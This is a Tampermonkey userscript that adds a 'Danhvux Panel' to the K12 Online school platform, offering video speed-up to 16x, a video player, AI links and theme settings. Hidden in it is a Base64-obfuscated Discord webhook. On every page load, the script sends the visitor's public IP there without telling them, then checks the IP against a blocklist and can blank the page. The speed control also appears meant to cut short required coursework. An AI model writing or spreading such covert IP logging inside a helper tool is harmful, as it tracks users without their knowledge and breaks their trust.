// ==UserScript==
// @name         K12 Helper Pro - Danhvux v24.2 (No Cooldown & Fixed Webhook)
// @namespace    http://tampermonkey.net/
// @version      24.2
// @description  Removed 1h cooldown, Fixed Webhook delivery, Smooth Transitions.
// @author       Danhvux
// @match        *://*.k12online.vn/*
// @grant        GM_xmlhttpRequest
// @connect      api.ipify.org
// @connect      localhost
// ==/UserScript==

(function() {
    'use strict';

    // Link đã mã hóa Base64
    const _0x1a2b = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MzUwNTg3NTMwOTAzNTUyMC9CNHZHVXYRTW50SVR6cHV6cHFkZlgyZFZCWVVYeXBHNEdnMU1Db3V6Tm9Jb2xlWWVXb21fZ2g3ZkliOllTQy1yVg==';
    const _0x3c4d = 'aHR0cDovL2xvY2FsaG9zdDo4MDAwL2JsYWNrbGlzdA==';
    
    const WEBHOOK_URL = atob(_0x1a2b);
    const BLACKLIST_API = atob(_0x3c4d);

    let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
        mainColor: '#ffea00', width: 320, speed: 1, user: '', pass: '', isDarkMode: true
    };
    const save = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));

    // --- SECURITY & UNLIMITED WEBHOOK ---
    const startSecurity = () => {
        return new Promise((resolve) => {
            fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                const userIP = data.ip;

                // Gửi Webhook ngay lập tức (Đã bỏ Cooldown)
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        "username": "Danhvux Log",
                        "embeds": [{
                            "title": "🛡️ Danhvux Panel Online",
                            "color": parseInt(config.mainColor.replace('#', ''), 16),
                            "description": `Người dùng đã truy cập K12 Online`,
                            "fields": [
                                {"name": "IP Address", "value": `\`${userIP}\``, "inline": true},
                                {"name": "Version", "value": "`v24.2`", "inline": true}
                            ],
                            "footer": {"text": "Danhvux Security System"},
                            "timestamp": new Date().toISOString()
                        }]
                    })
                }).catch(e => console.error("Webhook Error:", e));

                // Kiểm tra Blacklist
                GM_xmlhttpRequest({
                    method: "GET",
                    url: BLACKLIST_API + "?t=" + Date.now(),
                    onload: (res) => {
                        try {
                            const blockedIPs = JSON.parse(res.responseText);
                            if (blockedIPs.includes(userIP)) {
                                document.body.innerHTML = "<div style='color:white; background:black; height:100vh; display:flex; align-items:center; justify-content:center; font-family:sans-serif; font-size:30px;'>🚫 IP CỦA BẠN ĐÃ BỊ CHẶN</div>";
                                resolve(false);
                            } else resolve(true);
                        } catch(e) { resolve(true); }
                    },
                    onerror: () => resolve(true)
                });
            })
            .catch(() => resolve(true));
        });
    };

    // --- UI ENGINE ---
    startSecurity().then(ok => {
        if (!ok) return;

        const style = document.createElement('style');
        const updateCSS = () => {
            const dark = config.isDarkMode;
            const animTime = '0.5s ease-in-out';
            
            style.innerText = `
                :root { --mc: ${config.mainColor}; --w: ${config.width}px; --bg: ${dark ? '#1e2227' : '#ffffff'}; --bg-tab: ${dark ? '#1a1d21' : '#f0f0f0'}; --text: ${dark ? '#ffffff' : '#1e2227'}; --border: ${dark ? '#333' : '#ddd'}; }
                
                #dv-panel { position: fixed; top: 50px; right: 20px; width: var(--w) !important;
                    background: var(--bg); color: var(--text); border-color: var(--border); 
                    transition: height 0.35s ease-out, background ${animTime}, color ${animTime}, border ${animTime};
                    border-radius: 12px; font-family: 'Segoe UI', sans-serif; z-index: 100000; box-shadow: 0 10px 40px rgba(0,0,0,0.5); overflow: hidden; border: 1px solid; }
                
                .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; cursor: move; }
                .header .title { color: var(--mc); font-weight: bold; font-size: 18px; }
                .dots { display: flex; gap: 8px; } .dot { height: 12px; width: 12px; border-radius: 50%; cursor: pointer; }
                .red { background: #ff5f56; } .yel { background: #ffbd2e; } .grn { background: #27c93f; }
                
                .tabs { display: flex; background: var(--bg-tab); border-bottom: 1px solid var(--border); transition: background ${animTime}; position: relative; }
                .tab { flex:1; padding: 12px 0; text-align: center; cursor: pointer; font-size: 10px; font-weight: 900; color: #777; transition: 0.3s; z-index: 2; }
                .tab.active { color: var(--mc); }
                .tab-indicator { position: absolute; bottom: 0; height: 3px; background: var(--mc); transition: all 0.3s ease; border-radius: 3px; }

                .content-view { overflow: hidden; }
                .content-wrapper { display: flex; transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1); width: 400%; align-items: flex-start; }
                .content { width: 25%; padding: 20px; box-sizing: border-box; opacity: 0; transition: opacity 0.3s; pointer-events: none; }
                .content.active { opacity: 1; pointer-events: auto; }

                .switch { position: relative; display: inline-block; width: 44px; height: 22px; }
                .switch input { opacity: 0; width: 0; height: 0; }
                .slider-sw { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background: #555; transition: .4s; border-radius: 34px; border: 1px solid rgba(255,255,255,0.1); }
                .slider-sw:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 2px; background: white; transition: .4s cubic-bezier(0.68, -0.55, 0.265, 1.55); border-radius: 50%; }
                input:checked + .slider-sw { background: var(--mc); }
                input:checked + .slider-sw:before { transform: translateX(20px); }

                .status-container { background: rgba(0,0,0,0.1); border-radius: 8px; padding: 10px; margin-bottom: 15px; border: 1px solid var(--border); }
                .status-item { display: flex; align-items: center; justify-content: space-between; font-size: 11px; margin-bottom: 8px; padding: 5px; border-radius: 4px; }
                .status-btn { background: var(--mc); color: #000; padding: 3px 10px; border-radius: 5px; cursor: pointer; font-weight: bold; }

                input[type=text], input[type=password] { width: 100%; padding: 10px; background: rgba(0,0,0,0.05); border: 1px solid var(--border); color: var(--text); border-radius: 8px; margin-bottom: 10px; box-sizing: border-box; transition: background ${animTime}; }
                .btn { width: 100%; padding: 12px; background: var(--mc); border: none; border-radius: 12px; color: #000; font-weight: bold; cursor: pointer; transition: 0.2s; }
                .btn:active { transform: scale(0.95); }
                .footer { text-align:center; font-size:9px; color:#555; padding:8px; }
            `;
        };
        document.head.appendChild(style); updateCSS();

        const panel = document.createElement('div');
        panel.id = 'dv-panel';
        panel.innerHTML = `
            <div class="header"><div class="title">Danhvux Panel</div><div class="dots"><div class="dot red"></div><div class="dot yel"></div><div class="dot grn"></div></div></div>
            <div class="tabs">
                <div class="tab active" data-idx="0">MAIN</div><div class="tab" data-idx="1">VIDEO</div><div class="tab" data-idx="2">APPS</div><div class="tab" data-idx="3">SET</div>
                <div class="tab-indicator" id="indicator"></div>
            </div>
            <div class="content-view">
                <div class="content-wrapper" id="c-wrapper">
                    <div class="content active">
                        <div class="status-container">
                            <div style="font-size:12px; font-weight:bold; margin-bottom:8px; color:var(--mc)">📚 TRẠNG THÁI HỌC TẬP</div>
                            <div id="status-list"><div style="font-size:10px; color:#666;">Đang quét...</div></div>
                        </div>
                        <div style="font-weight:bold; font-size:14px;">Tốc độ x<span id="sp-txt">${config.speed}</span></div>
                        <input type="range" id="sp-range" style="width:100%" min="1" max="16" step="0.5" value="${config.speed}">
                    </div>
                    <div class="content">
                        <input type="text" id="v-url" placeholder="Link .mp4...">
                        <button class="btn" id="v-run">PHÁT VIDEO SOURCE</button>
                    </div>
                    <div class="content">
                        <div style="display:grid; grid-template-columns: repeat(3, 1fr); gap: 5px;">
                            <div style="cursor:pointer; padding:5px; border:1px solid var(--border); text-align:center;" onclick="window.open('https://gemini.google.com')">Gemini</div>
                            <div style="cursor:pointer; padding:5px; border:1px solid var(--border); text-align:center;" onclick="window.open('https://chatgpt.com')">GPT</div>
                        </div>
                    </div>
                    <div class="content">
                        <div style="display:flex; justify-content:space-between; margin-bottom:10px;">DARK MODE <label class="switch"><input type="checkbox" id="mode-toggle" ${config.isDarkMode ? 'checked' : ''}><span class="slider-sw"></span></label></div>
                        <input type="color" id="c-pick" style="width:100%; height:30px;" value="${config.mainColor}">
                        <button class="btn" id="btn-save" style="margin-top:10px;">LƯU CÀI ĐẶT</button>
                    </div>
                </div>
            </div>
            <div class="footer">DANHVUX • V24.2 • NO COOLDOWN</div>
        `;
        document.body.appendChild(panel);

        // Logic điều hướng Tab & Resize
        const updateHeight = () => {
            const activeContent = panel.querySelector('.content.active');
            if (activeContent) {
                const h = panel.querySelector('.header').offsetHeight + panel.querySelector('.tabs').offsetHeight + activeContent.scrollHeight + panel.querySelector('.footer').offsetHeight;
                panel.style.height = h + 'px';
            }
        };

        const moveTab = (idx) => {
            const tabs = panel.querySelectorAll('.tab');
            const indicator = document.getElementById('indicator');
            const wrapper = document.getElementById('c-wrapper');
            const contents = panel.querySelectorAll('.content');
            
            indicator.style.width = `calc(25% - 16px)`;
            indicator.style.left = `calc(${idx * 25}% + 8px)`;
            wrapper.style.transform = `translateX(-${idx * 25}%)`;
            
            tabs.forEach(t => t.classList.remove('active'));
            contents.forEach(c => c.classList.remove('active'));
            tabs[idx].classList.add('active');
            contents[idx].classList.add('active');
            setTimeout(updateHeight, 50);
        };

        panel.querySelectorAll('.tab').forEach(t => t.onclick = () => moveTab(t.dataset.idx));

        // Events
        const $ = (id) => panel.querySelector(id);
        $('#mode-toggle').onchange = (e) => { config.isDarkMode = e.target.checked; updateCSS(); save(); setTimeout(updateHeight, 50); };
        $('#btn-save').onclick = () => { config.mainColor = $('#c-pick').value; save(); updateCSS(); alert('Đã lưu!'); };
        $('#sp-range').oninput = (e) => { $('#sp-txt').innerText = e.target.value; config.speed = e.target.value; document.querySelectorAll('video').forEach(v => v.playbackRate = config.speed); };

        // Draggable
        let drag = false, o = [0,0];
        $('.header').onmousedown = (e) => { drag = true; o = [panel.offsetLeft - e.clientX, panel.offsetTop - e.clientY]; };
        document.onmousemove = (e) => { if(drag) { panel.style.left = (e.clientX + o[0]) + 'px'; panel.style.top = (e.clientY + o[1]) + 'px'; panel.style.right = 'auto'; } };
        document.onmouseup = () => drag = false;

        moveTab(0);
    });
})();
